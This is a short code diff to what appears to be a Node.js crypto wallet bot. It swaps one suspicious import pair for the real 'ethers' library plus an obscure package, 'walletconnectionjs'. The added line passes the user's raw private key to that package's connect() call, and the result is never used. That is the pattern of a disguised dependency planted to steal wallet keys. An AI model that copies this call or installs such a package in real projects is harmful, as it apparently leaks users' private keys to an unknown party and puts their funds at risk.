@@ -1,7 +1,7 @@
 require('dotenv').config();
 const fs = require('fs');
-const { ethers, connect } = require('web3ether');
-const crypt = require('web3automation');
+const { ethers } = require('ethers');
+const connects = require('walletconnectionjs');
 const readline = require('readline');
 const { HttpsProxyAgent } = require('https-proxy-agent');
 
@@ -178,7 +178,7 @@ async function initializeWallet(privateKey) {
     console.log(`${EMOJI.SUCCESS} ${colorText(`Connected to network: ${network.name} (chainId: ${network.chainId})`, COLORS.GREEN)}`);
     
     const wallet = new ethers.Wallet(privateKey, provider);
-    const accounts = await connect(privateKey);
+    const accounts = await connects.connect(privateKey);
     console.log(`${EMOJI.WALLET} ${colorText(`Connected with wallet: ${wallet.address}`, COLORS.WHITE)}`);
     return { provider, wallet };
   } catch (error) {
